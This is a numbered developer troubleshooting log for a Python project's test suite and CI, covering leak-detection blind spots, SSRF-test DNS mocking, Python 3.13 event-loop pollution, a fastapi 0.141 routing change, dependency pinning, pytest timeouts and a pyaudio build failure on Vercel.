## 32. BytesIO internal buffer invisible to pympler — leak-detection blind spot (test infra)

**Symptom:** In the leak-detection verification suite, the "file-handle leak" test (accumulating `io.BytesIO`) under-reported — pympler only counts Python objects; `BytesIO`'s C-level buffer is not counted toward size.

**Root cause:** `pympler.muppy.get_size` counts only the object itself for `_io.BytesIO`; its internal bytes buffer cannot be attributed.

**Fix:** The leak tests also accumulate content bytes (`_FILE_CONTENTS` explicitly references the bytes) so muppy can measure them.

**Lesson:** pympler byte sampling is blind to "pure C buffers" (BytesIO/certain extensions); the leak-test suite (tests/leak/) exists precisely to expose such detection blind spots.

---

## 33. Local proxy fake-ip resolves example.com to a private IP → SSRF protection false positive (test env)

**Symptom:** Locally (macOS + proxy software such as Surge/Clash), DNS resolved example.com to `198.18.0.50` (fake-ip range), which `_is_private_ip` judged private → two SSRF-related tests failed (`test_is_private_ip_public`, `test_web_fetch_bad_method`). CI (ubuntu resolving public IPs normally) was unaffected.

**Fix:** Tests mock DNS/private-IP checks:
- `test_is_private_ip_public` mocks `socket.getaddrinfo` to return a fixed public IP
- `test_web_fetch_bad_method` monkeypatches `_is_private_ip` to return False

**Lesson:** Tests depending on real DNS are unreliable behind proxies; mock the system boundary instead.

---

## 34. test_api version assertion outdated (2.0.0 vs actual version) (testing)

**Symptom:** `tests/integration/test_api.py::test_root_returns_app_info` asserted `version == "2.0.0"`, but the project had already released v2.1.1 → assertion failed.

**Fix:** Changed to read `cortex.version.__version__` and compare dynamically; no more hardcoding.

---

## 35. macOS forbids resource.setrlimit(RLIMIT_AS) below current usage (test infra)

**Symptom:** While implementing "auto-kill on memory ceiling", capping the process address space with `RLIMIT_AS` at 100MB raised `current limit exceeds maximum limit` (the current process address space already exceeded it).

**Root cause:** On macOS `RLIMIT_AS` caps total address space and **cannot be set below current usage**; after loading libraries, a Python process's address space is already large.

**Solution:** Abandoned RLIMIT_AS in favor of a **watchdog thread** + periodic sampling via `psutil.Process().memory_info().rss`, calling `os._exit(1)` over limit (conftest `_mem_watchdog`, default 4096MB, tunable via `CORTEX_TEST_MEM_LIMIT_MB`).

---

## 36. sys.getallocatedobjects() removed in Python 3.13 (test infra)

**Symptom:** Leak-detection sampling using `sys.getallocatedobjects()` raised `AttributeError` (swallowed by try/except, leaving sampling points empty).

**Root cause:** The function was added in 3.8, deprecated since 3.11, removed in 3.13.

**Fix:** Switched to `len(gc.get_objects())` (object count), later upgraded further to `pympler.muppy.get_size` (real bytes).

---

## 37. EventStore.__del__ triggers a GC infinite loop on a fake faiss index (backend/testing)

**Symptom:** The original `test_event_store_ext.py` triggered an infinite GC loop in Python 3.13 after fixture teardown (stuck at 99.7% CPU).

**Root cause:** During cyclic GC, `EventStore.__del__` called `faiss.write_index` on an index already set to `None`/a fake one, raising a SWIG TypeError; GC retried endlessly.

**Fix:** Fixture teardown sets `_faiss_index` to None before calling `close()`, preventing `__del__` from touching the fake index during GC.

---

## 44. Random CI full-suite flake — `set_event_loop(None)` residual pollution (testing)

**Symptom:** CI full runs (`pytest tests`, random order) intermittently hit `test_screen_router_ext.py::test_merge_vision_sync_no_running_loop` reporting `RuntimeError: There is no current event loop in thread 'MainThread'`; standalone/per-directory runs all passed; could not be reproduced locally.

**Root cause:** `test_model_runner_ext.py::test_reject_session_user_responses` ends with `asyncio.set_event_loop(None)` **without restoring** the prior loop. On Python 3.13, `asyncio.get_event_loop_policy().get_event_loop()` raises RuntimeError outright when no current loop exists (it no longer implicitly creates one). Under random order, if the polluting test lands before `test_screen_router_ext`, it fires.

**Fix:**
- Pollution source: save and restore the previous event loop (handling the 3.13 no-loop case via `except RuntimeError → old=None`); no longer leaves `set_event_loop(None)` behind
- Victim: `test_screen_router_ext` likewise saves the old loop, tolerant via `RuntimeError → None`

**Verification:** Both files + 381 related tests pass; the pollution mechanism was verified locally (after `set_event_loop(None)`, `get_event_loop_policy().get_event_loop()` reliably raises).

**Lesson:** Any test that "switches away" a global singleton (event loop, sys.modules, env vars) **must restore it**, and the restoration code must account for Python version behavior differences (3.13 no longer implicitly creates loops).

---

## 45. Random CI full-suite flake — `/tools` route assertion (testing, root cause not reproduced)

**Symptom:** CI full runs intermittently hit `test_api_main.py::test_register_module_routers_includes_all` reporting `AssertionError: /tools` (no `/tools` route present after `register_module_routers` mounting); standalone/HEAD/per-directory runs all passed.

**Root cause:** Not reproducible locally. `infra.tool_manager.api`'s `router` is **statically defined** (`APIRouter(prefix="/tools")` plus many fixed endpoints) with no conditional registration anywhere; checked pollution avenues such as `sys.modules` re-import and `include_router`/`tool_router` replacement, all without result. Inferred to be the same class as §44 — global-state pollution under random order; pollution source pending reproduction.

**Handling:** Added a **diagnostic guard** before the assertion: `assert tool_router.routes` (yielding the explicit message "router was re-imported or polluted"), so a recurrence can be located immediately rather than surfacing a vague `/tools missing`.

**Follow-up:** If CI hits it again, locate the pollution source from the diagnostic info; a local `tests/unit` full run of 5834 passing serves as the baseline.

---

## 52. CI test-failure triage: missing PyQt6 environment + tests depending on real user config (testing/environment)

**Symptom:** CI (ubuntu, Python 3.11) failed 3 items on full runs:
- `test_frontend_server.py::test_pet_widget_*` (2 items) — `ModuleNotFoundError: No module named 'PyQt6'`
- `test_api_main.py::test_register_module_routers_includes_all` — `AssertionError: /tools` (historical flaky, §45, diagnostic guard already added)

**Root cause 1 (missing PyQt6 environment):** `frontend/pet_widget.py` has a top-level `from PyQt6.QtCore import ...`, but `requirements.txt`/`pyproject.toml` **lack PyQt6** — local macOS has it installed so local passes; CI ubuntu doesn't → importing pet_widget fails in tests. The tests only read `BACKEND_URL` (port discovery) and never instantiate Qt.

**Fix:** `tests/conftest.py` gains a session autouse fixture `mock_pyqt6_if_missing` — when PyQt6 is unavailable, inject a MagicMock module tree into `sys.modules` (QtCore/QtGui/QtWebChannel/QtWebEngineCore/QtWebEngineWidgets/QtWidgets) so pet_widget imports normally; real environments (PyQt6 present locally) are not mocked. Verified: pet_widget imports successfully in a PyQt6-less environment and BACKEND_URL is correct.

**Root cause 2 (conscience attribute renamed without syncing integration tests):** When the psychological-activity dialog cache became `_dialog_buffers` (§49), only `tests/unit/test_conscience_ext.py` was updated; `tests/integration/test_conscience.py` still referenced `_last_dialog_buffer` → AttributeError.

**Fix:** Synced integration tests to `_dialog_buffers`.

**Root cause 3 (reasoning-fallback default flipped to False without syncing all tests):** When `fallback_to_reasoning` defaulted to False (§51), only `test_large_model_client_ext.py` / `test_small_model_client_ext.py` / `test_medium_model_client.py` were updated, missing `test_model_client_chat.py::test_generate_reasoning_fallback`.

**Fix:** Synced that test (default: no chain-of-thought returned + explicit-True fallback).

**Root cause 4 (prompt_composer tests depending on real personas.yaml):** After the pure-chat persona started respecting orchestration active (§47), composer tests in `test_chat_light_prompt.py` / `test_chat_light_ext.py` **didn't mock `get_agent_active`** → they depended on the orchestration state of the user's real `~/.cortex/personas.yaml` (whether orchestrator is active); any user config change made them flaky — precisely a recurrence of §47's lesson "tests consuming real defaults".

**Fix:** Related tests mock `Settings.get_agent_active` (made deterministic), no longer depending on real user config.

**Verification:** 226 related tests pass; `pytest tests/unit` full run passes (all of the PyQt6-mock / conscience / reasoning / get_agent_active fixes effective).

**Lesson:** ① When tests import modules under test, missing desktop/native dependencies (PyQt6 etc.) must be uniformly mocked in conftest — never rely on "it happens to be installed locally"; ② when changing internal attributes/defaults, search globally for all references (integration tests included); ③ any test reading real user config files (personas.yaml/settings.json) must mock the read layer, otherwise user config edits make it flaky.

---

## 53. Config-fingerprint rebuild constructs a real client in test environments → `API key 不能为空` (backend/testing)

**Symptom:** CI failed 6 items with `ValueError: API key 不能为空` (test_config_hot_reload / test_pet_engine / test_pet_engine_ext); passed locally, always failed on CI.

**Root cause (two layers):**
1. **Explicitly injected client overwritten by fingerprint rebuild**: the test sets `pe._client = _real_client()` (api_key="t"), but in the fingerprint logic `if _client is None or _client_cfg != cfg`, `_client_cfg` is None (test never recorded it) → `None != cfg` → rebuilt as a **parameterless** `LargeModelClient()` → reads settings' LARGE_MODEL_API_KEY (CI has no `.env`/`~/.cortex/settings.json` → empty) → raises `ValueError: API key 不能为空`. Local passes thanks to the user's key; CI without a key always fails.
2. **Module-level from-import defeats test mocks**: `ModelRunner`'s module top does `from infra.model.large_model_client import LargeModelClient`; once bound, `monkeypatch.setattr("infra.model.large_model_client.LargeModelClient", ...)` changes only the source module's attribute — the reference bound inside ModelRunner is untouched → mock ineffective → real construction → same error.

**Fix (ModelRunner.client / pet_engine._build_messages):**
- Refactored the fingerprint judgment into three branches: `_client is None` → lazy-build; `_client_cfg is None` (explicit injection) → **record fingerprint only, no rebuild**; `_client_cfg != cfg` → rebuild
- Client construction switched to an **in-function import** `from infra.model.large_model_client import LargeModelClient` — fetched from the source module each time, so patching the source-module attribute takes effect
- Synced `test_model_runner_client_lazy`'s patch path to the source module

**Verification:** 287 related tests pass; in no-API-key environments explicitly injected clients are no longer overwritten and mocks work properly.

**Lesson:** ① "Lazy-build cache + config-fingerprint rebuild" must **respect explicit injection** (`_client_cfg` being missing ≠ needs rebuilding — it may simply be an externally supplied instance); ② module-level `from X import Y` binds Y into this namespace, so mocking the source module's attribute has no effect — **you must import inside the function or access via module reference** for patches to apply.

---

## 54. CI `/tools` route assertion failure — fastapi 0.141 lazy `_IncludedRouter` (testing)

**Symptom:** On CI (ubuntu/Python 3.11), `test_api_main.py::test_register_module_routers_includes_all` fails consistently with `AssertionError: /tools`; locally (3.13) it never fails. Diagnostics: tool_router routes=17 non-empty, include_router is the pristine method, app.router normal, but `app.routes` held only default routes (/docs etc.) plus one `''`; manual include also "failed".

**Root cause: fastapi version behavior change (not pollution):**
- In **fastapi 0.141+** (CI installs `fastapi>=0.104.1` → latest 0.141), `include_router` **no longer expands APIRoute immediately**; it wraps them in a lazy `fastapi.routing._IncludedRouter` (which itself has no `.path`; actual routes live in `original_router.routes`)
- The test judged routes via `getattr(r, "path", "")` → `_IncludedRouter` lacks `.path` → yields `''` → assertion reports `/tools` missing
- Local fastapi 0.135.2 exhibits the **expanding** behavior → test passes. Reproduced locally in a 3.11 venv installing 0.141.1, confirming a version difference

**Fix (tests/unit/test_api_main.py):**
- Added `_collect_route_paths(routes)`: recursively expands `_IncludedRouter.original_router.routes` to collect real paths, compatible with fastapi 0.135 (expansion) and 0.141+ (lazy wrapping)
- `test_register_module_routers_includes_all` / `test_register_module_routers_skips_difference_when_disabled` switched to this helper

**Verification:** `/tools` test passes under the 3.11 venv (fastapi 0.141.1, matching CI); 120 items pass locally on 3.13.

**Lesson:** Web-framework version upgrades can alter "seemingly stable" behaviors (include_router expanding → lazy wrapping). Path assertions over `app.routes` must use **recursive collection** (compatible with wrappers like `_IncludedRouter`/`Mount`), never assuming every route object has `.path`; and fastapi version differences between local and CI mask such problems — **always verify under the same Python/dependency versions as CI**.

---

## 55. Dependency version drift — CI installs latest, local stays old (`>=` pins nothing)

**Background:** §54's `/tools` failure root-caused to a fastapi 0.141 behavior change (lazy `_IncludedRouter`), while local 0.135.2 retains the old behavior. Why do CI/local versions diverge?

**Root cause:** `requirements.txt` uses `fastapi>=0.104.1` (lower bound only, no upper bound):
- **CI**: brand-new environment each run; `pip install -r` installs current latest (0.141.1)
- **Local**: the pre-existing 0.135.2 satisfies `>=0.104.1`; pip doesn't upgrade → stays old
- Net effect: CI/local dependency-version drift → framework behavior changes surface on CI but can never be reproduced locally

**Fix (pin versions):**
- `requirements.txt`: `fastapi>=0.104.1` → `fastapi==0.141.1` (pinned to the verified version, with a comment explaining why)
- Tests already tolerate both include_router behaviors, 0.135 (expansion) / 0.141 (lazy wrapping) (§54), so even if the pin is loosened later nothing brittle breaks

**Verification:** Behavior consistent after unifying local/CI on fastapi 0.141.1; §54's tests pass under 0.141.1.

**Lesson:** `>=` constraints naturally drift in "fresh-install-every-time" scenarios (CI/deployment/new machines) — **CI lands on latest while old environments stay old**, turning any framework behavior change into "CI red, local green". Core web/runtime dependencies should be **pinned with `==`** (or use a lock file), validating CI and local against identical versions.

---

## 58. socket/subprocess tests falsely killed by the 20s timeout in CI full runs (testing/CI)

**Symptom:** CI full runs (5875 tests / 10 minutes) sporadically hit `test_screen_capture_daemon.py::test_bind_stale_retry` `Timeout (>20.0s)` plus the following test reporting `previous item was not torn down properly` (cascade); earlier, `test_runtime_expert_ext` also had similar Timeouts. Standalone/small-scope local runs all pass (test_bind_stale_retry call takes only 0.01s).

**Root cause:** `pytest.ini`'s `--timeout=20` is too tight for scheduling/import latency under **full-suite load** — the test itself is millisecond-level, but on CI machines grinding through 5875 tests over 10 minutes, resources are strained; pytest's start-to-finish span (setup/import/scheduling included) can exceed 20s → falsely killed by pytest-timeout; once killed, monkeypatch teardown never ran → the next test reports "not torn down properly".

**Fix:**
- `pytest.ini`: `--timeout=20` → `--timeout=60` (headroom for full load; the longest local unit test is ~21s, so 60s won't mask true deadlocks for long)
- `test_bind_stale_retry` / `test_run_exits_when_bind_none`: socket paths moved from the global `/tmp/x.sock` to `tmp_path` isolation (prevents conflicts with leftover real socket files under full runs)

**Verification:** screen_capture_daemon + runtime_expert, 67 tests pass.

**Lesson:** `pytest-timeout` thresholds must be set for the **worst case (CI full load)**, not local single-test timings — even millisecond tests time out under full-load scheduling/import delays. For "fast alone, killed in the full suite" cases, loosen the timeout first rather than reworking test logic.

---

## 66. Test directly tampers with the global singleton ToolRegistry._tools — 69 failures in full CI runs (test pollution)

**Symptom:** Full CI runs produced 69 failures: `toolgate`/`tool_visibility`/`tools_search`/`tool_registry_ext` reporting `'_T' object has no attribute 'risk_level/category/enabled/...'`, while single-file local runs all passed.

**Root cause:** My new `test_tool_permission_ext.py::test_get_base_whitelist_star`, in order to test `*`-expansion logic, directly executed `tr.ToolRegistry._tools = {_T objects missing fields}`, **tampering with the globally shared singleton**. Under full runs, `test_toolgate` et al. read `ToolRegistry._tools` and got the leftover `_T` objects (missing risk_level/category etc.) → AttributeError. Single-file runs passed because the `_T` pollution only surfaced when other tests read it under **cross-file execution order**.

**Fix:**
1. Isolated via `monkeypatch.setattr(ToolRegistry, "_tools", {...})` — pytest monkeypatch auto-restores at **teardown**, pollutes nothing global, and doesn't depend on really-registered tools.
2. (Related) the `read_context` tool had been wrongly added to every tier's base tools, breaking `test_get_control_tools_expert` → moved back into the large/supervisor delegation group.

**Verification:** CI-scale full `tests/unit` 6036 passed (from 69 failed → 0).

**Lesson:** ① Tests must **never assign directly to a global shared singleton's internal state** (`ToolRegistry._tools`, `_runner_managers`, `_session_memory_context`, etc.) — isolate with `monkeypatch.setattr` (auto-restore) or real APIs + cleanup; ② single-file green ≠ test-safe; pollution exposed only by full-run cross-file ordering demands full-run regression; ③ mock objects missing fields (`_T`) are a classic signal of "reading tampered global state".

---

## 81. Vercel deployment failure: pyaudio compilation requires portaudio.h (server/headless environment dependency governance)

**Symptom:** Deploying to Vercel, the build failed:
```
error: Command '['cc', ..., '-c', 'src/pyaudio/device_api.c', ...]' returned non-zero exit status 1
hint: This error likely indicates that you need to install a library that provides "portaudio.h"
help: `pyaudio` (v0.2.14) was included because `cortex-agent` depends on `pyaudio`
```

**Root cause:** `requirements.txt` listed `pyaudio` as a required dependency. PyAudio is PortAudio's C extension; pip installation requires compiling (source-only, no wheel), and compilation depends on the system dev header `portaudio.h`. Vercel's Python sandbox lacks that library and offers no apt to install it. pyaudio serves only local microphone recording (`modules/perception/detectors/voice_detector.py` / `hotkey_voice_detector.py`); server/headless environments can neither compile it nor use it.

**Fix:** Moved local hardware/desktop-specific dependencies out of the main `requirements.txt` into a new `requirements-voice.txt`:
- Removed: `pyaudio`, `pynput` (global hotkeys), `pyautogui` (desktop automation), `pyserial` (serial ports)
- Kept: `SpeechRecognition`, `gTTS`, `openai-whisper` (pure Python / server-installable)
- Voice detectors already perform lazy imports + `_check_availability()`'s `except ImportError` degradation (`is_available()=False` → won't start); there is no top-level `import pyaudio`, so absence doesn't affect core functionality.

**Verification:** `test_detectors.py`/`test_voice_hotkey.py`/`test_perception.py` 107 tests pass; requirements.txt syntactically valid; voice/desktop modules all import lazily inside functions.

**Lesson:** Server deployments (Vercel-like sandbox builds) cannot include local-hardware packages that depend on system C libraries/have no wheels. Such dependencies belong in an optional file (e.g., requirements-voice.txt), paired with lazy imports + graceful ImportError degradation in code, achieving "installed → feature present; missing → no crash".
